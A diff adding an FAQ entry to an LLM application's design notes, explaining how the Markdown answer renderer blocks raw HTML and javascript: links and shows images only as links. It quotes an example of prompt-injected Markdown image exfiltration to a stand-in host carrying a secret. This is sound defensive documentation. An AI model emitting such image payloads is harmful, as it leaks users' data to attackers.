@@ -1283,6 +1283,15 @@ Mitigations: delimit untrusted content, instruct the model to treat it as data, 
 above all limit the model's capabilities and blast radius. No prompt-only defense is
 complete.
 
+**Q: You render the LLM's answer as Markdown. Any risk?**
+Yes: the answer is derived from untrusted documents, so treat it as untrusted output. The
+UI (`frontend/src/components/Answer.tsx`) uses react-markdown *without* raw HTML (a
+`<script>` comes out as escaped text), its URL filter drops `javascript:` links, and
+external links open with `rel="noopener noreferrer"`. Markdown images are a known data-
+exfiltration trick (an injected `![](https://evil.example/?q=<secret>)` leaks data the
+moment the browser loads it), so images are rendered as plain links, never fetched. Math is rendered by
+KaTeX, which outputs plain HTML/CSS, not script.
+
 **Q: Why stream the response?**
 Perceived latency: users see text after ~1s (TTFT) instead of waiting for the full
 answer. SSE is simpler than WebSockets for one-way server→client streams.
